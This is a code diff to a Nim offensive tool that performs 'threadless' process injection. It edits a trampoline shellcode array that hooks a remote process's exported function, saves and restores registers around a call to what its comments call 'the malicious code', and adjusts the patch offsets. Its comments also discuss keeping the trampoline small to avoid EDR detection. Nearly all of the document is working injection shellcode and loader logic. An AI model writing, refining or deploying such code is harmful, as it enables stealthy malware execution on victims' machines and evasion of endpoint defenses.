@@ -36,7 +36,7 @@ let ThreadlessInjectStub * = """
 
 proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress: LPVOID): bool =
     var 
-        trampolineStk: array[75, byte]
+        trampolineStk: array[91, byte]
         trampSize: DWORD
         highBytePatched: DWORD64
         lowBytePatched: DWORD64
@@ -63,28 +63,38 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
     0x55,                                                           # PUSH RBP
     0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
     0x48, 0x83, 0xec, 0x08,                                         # SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
-    0x51,                                                           # push RCX                         : just save the context registers
+    0x50,                                                           # push RAX                         : just save the context registers
+    0x53,                                                           # push RBX
+    0x51,                                                           # push RCX                         
     0x52,                                                           # push RDX
     0x41, 0x50,                                                     # push R8
     0x41, 0x51,                                                     # push R9
     0x41, 0x52,                                                     # push R10
     0x41, 0x53,                                                     # push R11
+    0x41, 0x54,                                                     # push R12
+    0x41, 0x55,                                                     # push R13
+    0x41, 0x56,                                                     # push R14
     0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RCX, 0x0000000000000000   : restore the hooked function code
     0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RDX, 0x0000000000000000   : restore the hooked function code
     0x48, 0x89, 0x08,                                               # mov qword ptr[rax], rcx          : restore the hooked function code
     0x48, 0x89, 0x50, 0x08,                                         # mov qword ptr[rax+0x8], rdx      : restore the hooked function code
     0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
     0xff, 0xd0,                                                     # call RAX                         : Call the malicious code
+    0x41, 0x5E,                                                     # pop R14                          : Restore the context
+    0x41, 0x5D,                                                     # pop R13
+    0x41, 0x5C,                                                     # pop R12
     0x41, 0x5b,                                                     # pop R11                          : Restore the context
     0x41, 0x5a,                                                     # pop R10
     0x41, 0x59,                                                     # pop R9
     0x41, 0x58,                                                     # pop R8
     0x5a,                                                           # pop RDX
     0x59,                                                           # pop RCX
+    0x5b,                                                           # pop RBX
+    0x58,                                                           # pop RAX
     0xc9,                                                           # leave
     0xc3                                                            # ret   
     ]
-    trampSize = 75
+    trampSize = 91
 
     highBytePatched = 0
     lowBytePatched = 0
@@ -133,9 +143,9 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
 
     # Replace the place holders in the trampoline shellcode
     # with the righ values
-    moveMemory(unsafeAddr trampolineStk[26], &highBytePatched, sizeof(DWORD64))
-    moveMemory(unsafeAddr trampolineStk[36], &lowBytePatched, sizeof(DWORD64))
-    moveMemory(unsafeAddr trampolineStk[53], unsafeAddr jumpAddress, sizeof(DWORD64))
+    moveMemory(unsafeAddr trampolineStk[34], &highBytePatched, sizeof(DWORD64))
+    moveMemory(unsafeAddr trampolineStk[44], &lowBytePatched, sizeof(DWORD64))
+    moveMemory(unsafeAddr trampolineStk[61], unsafeAddr jumpAddress, sizeof(DWORD64))
     # Write the trampoline somewhere in memory
     # Here VirtualAlloc is used, but some code cave can be used to limit this call
     # As the trampoline size is lesser than 4Ko, we should be ok for EDR detections
